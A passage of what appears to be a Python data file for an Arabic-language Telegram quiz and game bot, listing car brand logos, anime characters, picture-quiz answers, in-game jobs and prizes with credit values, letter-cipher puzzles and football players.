            "brand": "ميني",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Mini.png"
        },
        {
            "brand": "ميتسوبيشي",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Mitsubishi.png"
        },
        {
            "brand": "نيسان",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Nissan.png"
        },
        {
            "brand": "اوبل",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Opel.png"
        },
        {
            "brand": "بيجو",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Peugeot.png"
        },
        {
            "brand": "بونتياك",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Pontiac.png"
        },
        {
            "brand": "بورش",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Porsche.png"
        },
        {
            "brand": "رام",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Ram.png"
        },
        {
            "brand": "رينولت",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Renault.png"
        },
        {
            "brand": "ساب",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Saab.png"
        },
        {
            "brand": "ساتورن",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Saturn.png"
        },
        {
            "brand": "سايون",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Scion.png"
        },
        {
            "brand": "سيت",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Seat.png"
        },
        {
            "brand": "سكودا",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Skoda.png"
        },
        {
            "brand": "سمارت",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Smart.png"
        },
        {
            "brand": "سانج يونج",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/SsangYong-1.png"
        },
        {
            "brand": "سوبارو",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Subaru.png"
        },
        {
            "brand": "سوزوكي",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Suzuki.png"
        },
        {
            "brand": "تيسلا",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Tesla.png"
        },
        {
            "brand": "تويوتا",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Toyota.png"
        },
        {
            "brand": "فولكس واغن",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Volkswagen.png"
        },
        {
            "brand": "فولفو",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/Volvo-1.png"
        },
        {
            "brand": "وايزمان",
            "photo": "https://www.izmostock.com/wp-content/uploads/2015/12/wiesmann.png"
        }
]

anime = [
        {
            "anime": "تين تين",
            "photo": "https://t.me/D7BotResources/153"
        },
        {
            "anime": "روك لي",
            "photo": "https://t.me/D7BotResources/152"
        },
        {
            "anime": "ساي",
            "photo": "https://t.me/D7BotResources/151"
        },
        {
            "anime": "كيبا",
            "photo": "https://t.me/D7BotResources/150"
        },
        {
            "anime": "زابوزا",
            "photo": "https://t.me/D7BotResources/149"
        },
        {
            "anime": "كيلر بي",
            "photo": "https://t.me/D7BotResources/148"
        },
        {
            "anime": "كيسامي",
            "photo": "https://t.me/D7BotResources/147"
        },
        {
            "anime": "ديدرا",
            "photo": "https://t.me/D7BotResources/146"
        },
        {
            "anime": "ساسوري",
            "photo": "https://t.me/D7BotResources/145"
        },
        {
            "anime": "نيجي",
            "photo": "https://t.me/D7BotResources/144"
        },
        {
            "anime": "شيكامارو",
            "photo": "https://t.me/D7BotResources/143"
        },
        {
            "anime": "جاي",
            "photo": "https://t.me/D7BotResources/142"
        },
        {
            "anime": "اسوما",
            "photo": "https://t.me/D7BotResources/141"
        },
        {
            "anime": "اوروتشيمارو",
            "photo": "https://t.me/D7BotResources/140"
        },
        {
            "anime": "ساكورا",
            "photo": "https://t.me/D7BotResources/139"
        },
        {
            "anime": "هيناتا",
            "photo": "https://t.me/D7BotResources/138"
        },
        {
            "anime": "مادارا",
            "photo": "https://t.me/D7BotResources/137"
        },
        {
            "anime": "ايتاشي",
            "photo": "https://t.me/D7BotResources/136"
        },
        {
            "anime": "كاكاشي",
            "photo": "https://t.me/D7BotResources/135"
        },
        {
            "anime": "اوبيتو",
            "photo": "https://t.me/D7BotResources/134"
        },
        {
            "anime": "هيروزن",
            "photo": "https://t.me/D7BotResources/133"
        },
        {
            "anime": "هيشيراما",
            "photo": "https://t.me/D7BotResources/132"
        },
        {
            "anime": "توبيراما",
            "photo": "https://t.me/D7BotResources/131"
        },
        {
            "anime": "ياماتو",
            "photo": "https://t.me/D7BotResources/130"
        },
        {
            "anime": "ميناتو",
            "photo": "https://t.me/D7BotResources/129"
        },
        {
            "anime": "كوشينا",
            "photo": "https://t.me/D7BotResources/128"
        },
        {
            "anime": "ساسكي",
            "photo": "https://t.me/D7BotResources/127"
        },
        {
            "anime": "جيرايا",
            "photo": "https://t.me/D7BotResources/126"
        },
        {
            "anime": "باين",
            "photo": "https://t.me/D7BotResources/125"
        },
        {
            "anime": "غارا",
            "photo": "https://t.me/D7BotResources/124"
        },
        {
            "anime": "ناروتو",
            "photo": "https://t.me/D7BotResources/123"
        },
        {
            "anime": "ايس",
            "photo": "https://t.me/D7BotResources/122"
        },
        {
            "anime": "تشوبر",
            "photo": "https://t.me/D7BotResources/121"
        },
        {
            "anime": "باجي",
            "photo": "https://t.me/D7BotResources/120"
        },
        {
            "anime": "كوبي",
            "photo": "https://t.me/D7BotResources/119"
        },
        {
            "anime": "كيزارو",
            "photo": "https://t.me/D7BotResources/118"
        },
        {
            "anime": "اكاينو",
            "photo": "https://t.me/D7BotResources/117"
        },
        {
            "anime": "جينبي",
            "photo": "https://t.me/D7BotResources/116"
        },
        {
            "anime": "اينيل",
            "photo": "https://t.me/D7BotResources/115"
        },
        {
            "anime": "كاتاكوري",
            "photo": "https://t.me/D7BotResources/114"
        },
        {
            "anime": "روب لوتشي",
            "photo": "https://t.me/D7BotResources/113"
        },
        {
            "anime": "كايدو",
            "photo": "https://t.me/D7BotResources/112"
        },
        {
            "anime": "اوكيجي",
            "photo": "https://t.me/D7BotResources/111"
        },
        {
            "anime": "تيتش",
            "photo": "https://t.me/D7BotResources/110"
        },
        {
            "anime": "غارب",
            "photo": "https://t.me/D7BotResources/109"
        },
        {
            "anime": "دراغون",
            "photo": "https://t.me/D7BotResources/108"
        },
        {
            "anime": "اودن",
            "photo": "https://t.me/D7BotResources/107"
        },
        {
            "anime": "اوياجي",
            "photo": "https://t.me/D7BotResources/106"
        },
        {
            "anime": "كروكودايل",
            "photo": "https://t.me/D7BotResources/105"
        },
        {
            "anime": "بروك",
            "photo": "https://t.me/D7BotResources/104"
        },
        {
            "anime": "فرانكي",
            "photo": "https://t.me/D7BotResources/103"
        },
        {
            "anime": "اوسوب",
            "photo": "https://t.me/D7BotResources/102"
        },
        {
            "anime": "روبن",
            "photo": "https://t.me/D7BotResources/101"
        },
        {
            "anime": "سابو",
            "photo": "https://t.me/D7BotResources/100"
        },
        {
            "anime": "دوفلامينغو",
            "photo": "https://t.me/D7BotResources/99"
        },
        {
            "anime": "ريلي",
            "photo": "https://t.me/D7BotResources/98"
        },
        {
            "anime": "لاو",
            "photo": "https://t.me/D7BotResources/97"
        },
        {
            "anime": "ميهوك",
            "photo": "https://t.me/D7BotResources/96"
        },
        {
            "anime": "كابتن كيد",
            "photo": "https://t.me/D7BotResources/95"
        },
        {
            "anime": "ماركو",
            "photo": "https://t.me/D7BotResources/94"
        },
        {
            "anime": "سموكر",
            "photo": "https://t.me/D7BotResources/93"
        },
        {
            "anime": "شانكس",
            "photo": "https://t.me/D7BotResources/92"
        },
        {
            "anime": "سانجي",
            "photo": "https://t.me/D7BotResources/91"
        },
        {
            "anime": "زورو",
            "photo": "https://t.me/D7BotResources/90"
        }
    ]
emojis_pics = [
        {
            "emoji": "📸😶",
            "photo": "https://t.me/D7BotResources/46"
        },
        {
            "emoji": "🪐😳",
            "photo": "https://t.me/D7BotResources/44"
        },
        {
            "emoji": "🖖🏻💔",
            "photo": "https://t.me/D7BotResources/43"
        },
        {
            "emoji": "🙄🖇️",
            "photo": "https://t.me/D7BotResources/42"
        },
        {
            "emoji": "🥥",
            "photo": "https://t.me/D7BotResources/41"
        },
        {
            "emoji": "🌷",
            "photo": "https://t.me/D7BotResources/40"
        },
        {
            "emoji": "🍬",
            "photo": "https://t.me/D7BotResources/39"
        },
        {
            "emoji": "🐸",
            "photo": "https://t.me/D7BotResources/38"
        },
        {
            "emoji": "🍏",
            "photo": "https://t.me/D7BotResources/35"
        },
        {
            "emoji": "💋",
            "photo": "https://t.me/D7BotResources/34"
        },
        {
            "emoji": "🔓",
            "photo": "https://t.me/D7BotResources/33"
        },
        {
            "emoji": "🦁",
            "photo": "https://t.me/D7BotResources/32"
        },
        {
            "emoji": "🥳🍯",
            "photo": "https://t.me/D7BotResources/30"
        },
        {
            "emoji": "🔒😇",
            "photo": "https://t.me/D7BotResources/29"
        },
        {
            "emoji": "😊🌺",
            "photo": "https://t.me/D7BotResources/28"
        },
        {
            "emoji": "👑",
            "photo": "https://t.me/D7BotResources/27"
        },
        {
            "emoji": "🧸",
            "photo": "https://t.me/D7BotResources/26"
        },
        {
            "emoji": "🙈⚡",
            "photo": "https://t.me/D7BotResources/25"
        },
        {
            "emoji": "🐣",
            "photo": "https://t.me/D7BotResources/24"
        },
        {
            "emoji": "🎠",
            "photo": "https://t.me/D7BotResources/23"
        },
        {
            "emoji": "🍩",
            "photo": "https://t.me/D7BotResources/22"
        },
        {
            "emoji": "🔮",
            "photo": "https://t.me/D7BotResources/20"
        },
        {
            "emoji": "☁️",
            "photo": "https://t.me/D7BotResources/19"
        },
        {
            "emoji": "💣",
            "photo": "https://t.me/D7BotResources/18"
        },
        {
            "emoji": "💩🙃",
            "photo": "https://t.me/D7BotResources/17"
        },
        {
            "emoji": "🌊😭",
            "photo": "https://t.me/D7BotResources/15"
        },
        {
            "emoji": "✨",
            "photo": "https://t.me/D7BotResources/13"
        },
        {
            "emoji": "🥶💅",
            "photo": "https://t.me/D7BotResources/12"
        },
        {
            "emoji": "🌀",
            "photo": "https://t.me/D7BotResources/11"
        },
        {
            "emoji": "🍭",
            "photo": "https://t.me/D7BotResources/10"
        },
        {
            "emoji": "🍰",
            "photo": "https://t.me/D7BotResources/9"
        },
        {
            "emoji": "🐶",
            "photo": "https://t.me/D7BotResources/8"
        },
        {
            "emoji": "😷🤍",
            "photo": "https://t.me/D7BotResources/7"
        },
        {
            "emoji": "🪓",
            "photo": "https://t.me/D7BotResources/6"
        },
        {
            "emoji": "😮‍💨🦁",
            "photo": "https://t.me/D7BotResources/5"
        },
        {
            "emoji": "🥳🦠",
            "photo": "https://t.me/D7BotResources/4"
        },
        {
            "emoji": "🍩😋",
            "photo": "https://t.me/D7BotResources/3"
        }
]
pics = [
        {
            "answer": "باب",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/224"
        },
        {
            "answer": "كيت كات",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/222"
        },
        {
            "answer": "كيندر",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/220"
        },
        {
            "answer": "توكس",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/218"
        },
        {
            "answer": "عقرب",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/216"
        },
        {
            "answer": "ميكي ماوس",
            "caption": "وش اسم الكرتون؟",
            "photo": "https://t.me/LANBOT1/214"
        },
        {
            "answer": "ملعقه",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/212"
        },
        {
            "answer": "شوكة",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/210"
        },
        {
            "answer": "خفاش",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/208"
        },
        {
            "answer": "هدهد",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/206"
        },
        {
            "answer": "بطريق",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/204"
        },
        {
            "answer": "بومه",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/202"
        },
        {
            "answer": "صقر",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/200"
        },
        {
            "answer": "الحوت",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/198"
        },
        {
            "answer": "مرجيحه",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/196"
        },
        {
            "answer": "راديو",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/194"
        },
        {
            "answer": "قصر المصمك",
            "caption": "وش اسم هذا المعلم؟",
            "photo": "https://t.me/LANBOT1/192"
        },
        {
            "answer": "دلفين",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/190"
        },
        {
            "answer": "قرش",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/188"
        },
        {
            "answer": "اندومي",
            "caption": "شعار مين؟",
            "photo": "https://t.me/LANBOT1/186"
        },
        {
            "answer": "بشت",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/184"
        },
        {
            "answer": "باص",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/182"
        },
        {
            "answer": "اسعاف",
            "caption": "وش الي بالصورة؟",
            "photo": "https://t.me/LANBOT1/180"
        },
        {
            "answer": "مطافي",
            "caption": "وش الي بالصورة؟",
            "photo": "https://t.me/LANBOT1/178"
        },
        {
            "answer": "هيونداي",
            "caption": "وش اسم شركة السيارة؟",
            "photo": "https://t.me/LANBOT1/176"
        },
        {
            "answer": "مازدا",
            "caption": "وش اسم الشركة السيارة؟",
            "photo": "https://t.me/LANBOT1/174"
        },
        {
            "answer": "فورد",
            "caption": "وش اسم شركة السيارة؟",
            "photo": "https://t.me/LANBOT1/172"
        },
        {
            "answer": "طاوس",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/170"
        },
        {
            "answer": "بغبغاء",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/168"
        },
        {
            "answer": "عايض يوسف",
            "caption": "مين هذا المغني؟",
            "photo": "https://t.me/LANBOT1/166"
        },
        {
            "answer": "عبدالمجيد عبدالله",
            "caption": "مين هذا المغني ؟",
            "photo": "https://t.me/LANBOT1/164"
        },
        {
            "answer": "محمد عبده",
            "caption": "مين هذا المشهور؟",
            "photo": "https://t.me/LANBOT1/162"
        },
        {
            "answer": "طلال مداح",
            "caption": "مين هذا المشهور؟",
            "photo": "https://t.me/LANBOT1/160"
        },
        {
            "answer": "فخار",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/158"
        },
        {
            "answer": "عمان",
            "caption": "علم اي دولة؟",
            "photo": "https://t.me/LANBOT1/156"
        },
        {
            "answer": "قطر",
            "caption": "علم اي دولة؟",
            "photo": "https://t.me/LANBOT1/154"
        },
        {
            "answer": "البحرين",
            "caption": "علم اي دولة؟",
            "photo": "https://t.me/LANBOT1/152"
        },
        {
            "answer": "الكويت",
            "caption": "علم اي دولة؟",
            "photo": "https://t.me/LANBOT1/150"
        },
        {
            "answer": "الامارات",
            "caption": "علم اي دولة؟",
            "photo": "https://t.me/LANBOT1/148"
        },
        {
            "answer": "السعودية",
            "caption": "علم اي دولة؟",
            "photo": "https://t.me/LANBOT1/146"
        },
        {
            "answer": "الصين",
            "caption": "علم اي دولة؟",
            "photo": "https://t.me/LANBOT1/144"
        },
        {
            "answer": "سلم",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/142"
        },
        {
            "answer": "خليفه",
            "caption": "وش اسم البرج؟",
            "photo": "https://t.me/LANBOT1/140"
        },
        {
            "answer": "ايفل",
            "caption": "وش اسم البرج ؟",
            "photo": "https://t.me/LANBOT1/138"
        },
        {
            "answer": "ريحان",
            "caption": "وش اسم النبتة؟",
            "photo": "https://t.me/LANBOT1/136"
        },
        {
            "answer": "ياسمين",
            "caption": "وش اسم النبتة؟",
            "photo": "https://t.me/LANBOT1/134"
        },
        {
            "answer": "دوار الشمس",
            "caption": "وش اسم النبتة؟",
            "photo": "https://t.me/LANBOT1/132"
        },
        {
            "answer": "كوالا",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/130"
        },
        {
            "answer": "كلاش اوف كلانس",
            "caption": "وش اسم اللعبة؟",
            "photo": "https://t.me/LANBOT1/128"
        },
        {
            "answer": "ساوند",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/126"
        },
        {
            "answer": "ريف",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/124"
        },
        {
            "answer": "ديسكورد",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/122"
        },
        {
            "answer": "بلاتو",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/120"
        },
        {
            "answer": "تويتش",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/118"
        },
        {
            "answer": "فيس",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/116"
        },
        {
            "answer": "تويتر",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/114"
        },
        {
            "answer": "تيك توك",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/112"
        },
        {
            "answer": "تايوتا",
            "caption": "ما هي شركة السيارة؟",
            "photo": "https://t.me/LANBOT1/110"
        },
        {
            "answer": "اكورد",
            "caption": "ما هي شركة السيارة؟",
            "photo": "https://t.me/LANBOT1/108"
        },
        {
            "answer": "بي ام",
            "caption": "ماهي شركة السيارة؟",
            "photo": "https://t.me/LANBOT1/106"
        },
        {
            "answer": "جمس",
            "caption": "ما هي شركة السيارة؟",
            "photo": "https://t.me/LANBOT1/104"
        },
        {
            "answer": "تميم",
            "caption": "مين هذا الملك؟",
            "photo": "https://t.me/LANBOT1/102"
        },
        {
            "answer": "احلام",
            "caption": "مين هذه المشهوره؟",
            "photo": "https://t.me/LANBOT1/100"
        },
        {
            "answer": "سوني",
            "caption": "وش اسم الشركة؟",
            "photo": "https://t.me/LANBOT1/98"
        },
        {
            "answer": "منشار",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/96"
        },
        {
            "answer": "وزارة الداخلية",
            "caption": "شعار اي جهه حكومية؟",
            "photo": "https://t.me/LANBOT1/94"
        },
        {
            "answer": "يوتيوب",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/92"
        },
        {
            "answer": "انستا",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/90"
        },
        {
            "answer": "سناب شات",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/88"
        },
        {
            "answer": "نواف الاحمد",
            "caption": "مين هذا الملك؟",
            "photo": "https://t.me/LANBOT1/86"
        },
        {
            "answer": "خليفة بن زايد",
            "caption": "مين هذا الملك؟",
            "photo": "https://t.me/LANBOT1/84"
        },
        {
            "answer": "محمد بن سلمان",
            "caption": "مين هذا الامير؟",
            "photo": "https://t.me/LANBOT1/82"
        },
        {
            "answer": "فايز المالكي",
            "caption": "مين هذا المشهور؟",
            "photo": "https://t.me/LANBOT1/80"
        },
        {
            "answer": "جيتار",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/78"
        },
        {
            "answer": "مكيف",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/76"
        },
        {
            "answer": "تيلفزيون",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/74"
        },
        {
            "answer": "نمر",
            "caption": "وش الحيوان الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/72"
        },
        {
            "answer": "لبوه",
            "caption": "وش الحيوان الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/70"
        },
        {
            "answer": "مشط",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/68"
        },
        {
            "answer": "بقره",
            "caption": "وش الحيوان الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/66"
        },
        {
            "answer": "زرافه",
            "caption": "وش الحيوان الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/64"
        },
        {
            "answer": "كورة",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/62"
        },
        {
            "answer": "ثلاجه",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/60"
        },
        {
            "answer": "تيليجرام",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/58"
        },
        {
            "answer": "كيان",
            "caption": "شعار مين؟",
            "photo": "https://t.me/LANBOT1/56"
        },
        {
            "answer": "ستاربكس",
            "caption": "شعار مين؟",
            "photo": "https://t.me/LANBOT1/54"
        },
        {
            "answer": "تركيا",
            "caption": "علم اي دولة؟",
            "photo": "https://t.me/LANBOT1/52"
        },
        {
            "answer": "واتساب",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/50"
        },
        {
            "answer": "سوني",
            "caption": None,
            "photo": "https://t.me/LANBOT1/48"
        },
        {
            "answer": "كوره تنس",
            "caption": "وش الي فالصورة؟",
            "photo": "https://t.me/LANBOT1/46"
        },
        {
            "answer": "ديسكورد",
            "caption": "وش اسم التطبيق؟",
            "photo": "https://t.me/LANBOT1/44"
        },
        {
            "answer": "ابل",
            "caption": "شعار اي شركة؟",
            "photo": "https://t.me/LANBOT1/42"
        },
        {
            "answer": "ميرندا",
            "caption": None,
            "photo": "https://t.me/LANBOT1/40"
        },
        {
            "answer": "حوت",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/38"
        },
        {
            "answer": "ملعب",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/36"
        },
        {
            "answer": "طارق",
            "caption": "مين هذي الشخصية ؟",
            "photo": "https://t.me/LANBOT1/34"
        },
        {
            "answer": "كهف",
            "caption": "اسرع واحد يقول اسم ذا",
            "photo": "https://t.me/LANBOT1/32"
        },
        {
            "answer": "قراند",
            "caption": "اسرع واحد يقول اسم ذا",
            "photo": "https://t.me/LANBOT1/30"
        },
        {
            "answer": "ماك",
            "caption": "اسرع واحد يقول اسم ذا",
            "photo": "https://t.me/LANBOT1/28"
        },
        {
            "answer": "سونيك",
            "caption": "مين هذه الشخصيه؟",
            "photo": "https://t.me/LANBOT1/26"
        },
        {
            "answer": "سلاحف نينجا",
            "caption": "وش اسم الكرتون؟",
            "photo": "https://t.me/LANBOT1/24"
        },
        {
            "answer": "كوره",
            "caption": "وش الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/22"
        },
        {
            "answer": "حمار",
            "caption": "وش اسم الحيوان؟",
            "photo": "https://t.me/LANBOT1/20"
        },
        {
            "answer": "توتنهام",
            "caption": "وش اسم النادي؟",
            "photo": "https://t.me/LANBOT1/12"
        },
        {
            "answer": "نجار",
            "caption": "وش اسم المهنه؟",
            "photo": "https://t.me/LANBOT1/10"
        },
        {
            "answer": "قرش",
            "caption": "اسرع واحد يقول اسم ذا",
            "photo": "https://t.me/LANBOT1/8"
        },
        {
            "answer": "زرافه",
            "caption": "وش الحيوان الي في الصورة؟",
            "photo": "https://t.me/LANBOT1/6"
        },
        {
            "answer": "نوتيلا",
            "caption": "اسرع واحد يقول اسم ذا",
            "photo": "https://t.me/LANBOT1/4"
        },
        {
            "answer": "تنس",
            "caption": "وش اسم اللعبه؟",
            "photo": "https://t.me/LANBOT1/2"
        }
]

jobs = [
   {'name': '👨‍💻 مبرمج', 'credit': 2000},
   {'name': '🧑‍💼 مهندس', 'credit': 4500},
   {'name': '💃 رقاصه', 'credit': 2500},
   {'name': '🕌 امام جامع', 'credit': 4000},
   {'name': '👨‍⚕️ دكتور', 'credit': 5000},
   {'name': '🧑‍⚕️ ممرض', 'credit': 1000},
   {'name': '🧑‍💼️ مستشار', 'credit': 3000},
   {'name': '🧑‍⚖️ قاضي', 'credit': 1500},
   {'name': '🏦 مدير بنك', 'credit': 13000},
   {'name': '🧑‍🏫 مدرس', 'credit': 4000},
   {'name': '🏌️ كابتن', 'credit': 4500},
   {'name': '🧑‍🔧 عامل بناء', 'credit': 500},
   {'name': '🧑‍🦯 عامل نظافة', 'credit': 1500},
   {'name': '🦸 ممثل', 'credit': 5000},
   {'name': '👨‍🎤 مغني', 'credit': 4500},
   {'name': '🛝 حارس حديقة', 'credit': 2000},
   {'name': '🔋 بطارية سامسونج', 'credit': 3500},
   {'name': '🏄 سباح', 'credit': 1500},
   {'name': '🧑‍🚒 رجل اطفاء', 'credit': 2500},
   {'name': '🧑‍🍳 طباخ', 'credit': 5000},
   {'name': '🧑‍🎨 رسام', 'credit': 2000},
]
knzs = [
   {'name': 'مصاصة 🍬', 'credit': 200},
   {'name': 'تاج 👑', 'credit': 45000},
   {'name': 'مجوهرة 💎', 'credit': 25000},
   {'name': 'مايكروفون 🎙️', 'credit': 4000},
   {'name': 'موزة 🍌', 'credit': 5000},
   {'name': 'خاتم 💍', 'credit': 10000},
   {'name': 'كيكة 🍰', 'credit': 3000},
   {'name': 'ايفون 🍎', 'credit': 1500},
   {'name': 'هواوي ♾️', 'credit': 13000},
   {'name': 'بوسة من المطور 💋', 'credit': 500000},
   {'name': 'طيارة ✈️', 'credit': 4500},
   {'name': 'سيارة 🚗', 'credit': 500},
   {'name': 'صاروخ 🚀', 'credit': 1500},
   {'name': 'ار بي جي 💣', 'credit': 5000},
   {'name': 'مفتاح 🔑', 'credit': 4500},
   {'name': 'شنطة سف 💼ر', 'credit': 2000},
   {'name': 'عملة نادرة 🪙', 'credit': 3500},
   {'name': 'بطارية 🔋', 'credit': 1500},
   {'name': 'كاميرا 📸', 'credit': 2500},
   {'name': 'شاورما 🥙', 'credit': 5000},
   {'name': 'بيتزا 🍕', 'credit': 2000},
]

tashfeer = [
        {
            "answer": "وهم",
            "caption": "فك تشفير : خ-م-ه",
            "photo": "https://t.me/LANBOT2/50"
        },
        {
            "answer": "زعلان",
            "caption": "فك تشفير : د-ك-ن-ب-ل",
            "photo": "https://t.me/LANBOT2/48"
        },
        {
            "answer": "فرح",
            "caption": "فك تشفير : ث-ة-ي",
            "photo": "https://t.me/LANBOT2/46"
        },
        {
            "answer": "صابر",
            "caption": "فك تشفير : ظ-ب-ا-ة",
            "photo": "https://t.me/LANBOT2/44"
        },
        {
            "answer": "حشره",
            "caption": "فك تشفير : ي-س-ة-م",
            "photo": "https://t.me/LANBOT2/42"
        },
        {
            "answer": "سراج",
            "caption": "فك تشفير : ش-ة-ب-ت",
            "photo": "https://t.me/LANBOT2/40"
        },
        {
            "answer": "حفرة",
            "caption": "فك تشفير : ي-ث-ة-ر",
            "photo": "https://t.me/LANBOT2/38"
        },
        {
            "answer": "قدوة",
            "caption": "فك تشفير : ى-ز-خ-ر",
            "photo": "https://t.me/LANBOT2/36"
        },
        {
            "answer": "ثامر",
            "caption": "فك تشفير : ف-ب-ه-ة",
            "photo": "https://t.me/LANBOT2/34"
        },
        {
            "answer": "اصحاب",
            "caption": "فك تشفير : ب-ظ-ي-ب-ا",
            "photo": "https://t.me/LANBOT2/32"
        },
        {
            "answer": "قمر",
            "caption": "فك تشفير : ى-ه-ة",
            "photo": "https://t.me/LANBOT2/30"
        },
        {
            "answer": "دزها",
            "caption": "تشفير : ز-د-م-ب",
            "photo": "https://t.me/LANBOT2/28"
        },
        {
            "answer": "يحلو",
            "caption": "فك تشفير : ح-ي-ن-خ",
            "photo": "https://t.me/LANBOT2/26"
        },
        {
            "answer": "قزع",
            "caption": "فك تشفير : ى-د-ك",
            "photo": "https://t.me/LANBOT2/24"
        },
        {
            "answer": "تعثر",
            "caption": "فك تشفير : ج-ك-ف-ة",
            "photo": "https://t.me/LANBOT2/22"
        },
        {
            "answer": "لاتياس",
            "caption": "فك تشفير : ن-ب-ج-ح-ب-ش",
            "photo": "https://t.me/LANBOT2/20"
        },
        {
            "answer": "مرض",
            "caption": "فك تشفير : ض-ة-م",
            "photo": "https://t.me/LANBOT2/18"
        },
        {         
            "answer": "باب",
            "caption": "فك تشفير : ا-ب-ا",
            "photo": "https://t.me/LANBOT2/16"
        },
        {         
            "answer": "جول",
            "caption": "فك تشفير : ت-خ-ن",
            "photo": "https://t.me/LANBOT2/14"
        },
        {         
            "answer": "يامز",
            "caption": "فك تشفير : ح-ب-ه-د",
            "photo": "https://t.me/LANBOT2/12"
        },
        {
            "answer": "محمد",
            "caption": "فك تشفير : ه-ي-ه-ز",
            "photo": "https://t.me/LANBOT2/10"
        },
        {
            "answer": "تاجر",
            "caption": "فك تشفير : ج-ب-ت-ة",
            "photo": "https://t.me/LANBOT2/8"
        },
        {
            "answer": "هطف",
            "caption": "فك تشفير : م-ء-ث",
            "photo": "https://t.me/LANBOT2/6"
        },
        {
            "answer": "دز",
            "caption": "فك تشفير : ز-د",
            "photo": "https://t.me/LANBOT2/4"
        },
        {
            "answer": "تاج",
            "caption": "فك تشفير : ج-ب-ت",
            "photo": "https://t.me/LANBOT2/2"
        }
]

football = [
        {
            "answer": "الميعوف",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/52"
        },
        {
            "answer": "سالم الدوسري",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/54"
        },
        {
            "answer": "العويس",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/56"
        },
        {
